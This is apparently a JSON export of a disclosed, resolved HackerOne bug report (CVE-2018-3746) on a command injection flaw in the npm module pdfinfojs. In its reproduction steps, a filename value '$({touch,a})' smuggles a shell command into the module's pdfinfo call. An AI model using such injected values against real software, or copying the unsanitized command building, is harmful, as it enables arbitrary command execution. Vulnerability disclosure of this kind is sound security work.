{
  "id": 330957,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzA5NTc=",
  "url": "https://hackerone.com/reports/330957",
  "title": "[pdfinfojs] Command Injection on filename parameter",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-03-29T01:18:13.084Z",
  "submitted_at": "2018-03-29T01:18:13.084Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "caioluders",
    "url": "/caioluders",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/dj1bj162w9m51oskm97usq7dw652/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-3746"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-04-19T07:31:54.253Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-04-19T07:14:48.131Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello , there is a Command Injection vulnerability on the \"pdfinfojs\" module.\n\n# Module\n\n**module name:** pdfinfojs\n**version:** 0.3.6\n**npm page:** https://www.npmjs.com/package/pdfinfojs\n\n## Module Description\n\n> pdfinfo shell wrapper for Node.js\n\n## Module Stats\n\n10 downloads in the last day\n61 downloads in the last week\n106 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\n> The module appends the filename parameter to the command on the lines [28](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L28), [47](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L47) and [72](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L72) without parsing the user input, thus leading to a Command Injection. \n\n## Steps To Reproduce:\n\n* Install the module \n\n```\n$ npm install pdfinfojs\n```\n\n* Example code, similar to the documentation, with the malicious filename `$({touch,a})` :\n\n```javascript\nvar pdfinfo = require('pdfinfojs'),\n    pdf = new pdfinfo('$({touch,a})'); // Malicious payload\n\npdf.getInfo(function(err, info, params) {\n  if (err) {\n    console.error(err.stack);\n  }\n  else {\n    console.log(info); //info is an object\n    console.log(params); // commandline params passed to pdfinfo cmd\n  }\n});\n```\n\n*there are a lot of possibles payloads to achieve this, used this brace expansion just because space in the file name sucks*\n\n* Run the code \n\n```\n$ node index.js\nError\n    ... it throws an error, but the execution is successful\n```\n* Check the newly created file \n\n```\n$ ls\na\t\tindex.js\n```\n\n## Patch\n\nIt is advisable to use a module that explicitly isolates the parameters to the `pdfinfo` command.\n\n## Tested on :\n\n- macOS Sierra 10.12.16\n- NODEJS v8.4.0\n- NPM 5.3.0\n\n**( contacted the maintainer || opened issue ) = False**\n\n## Impact\n\nAn attacker can execute arbitrary commands on the victim's machine",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-05-19T07:14:48.227Z",
  "allow_singular_disclosure_after": -181115207.17254695,
  "singular_disclosure_allowed": true,
  "vote_count": 15,
  "voters": [
    "herrera",
    "muon4",
    "bl4de",
    "apapedulimu",
    "naategh",
    "eveeez",
    "kieran",
    "ranjit_p",
    "japz",
    "0x08",
    "and 5 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 8250,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "pdfinfojs",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
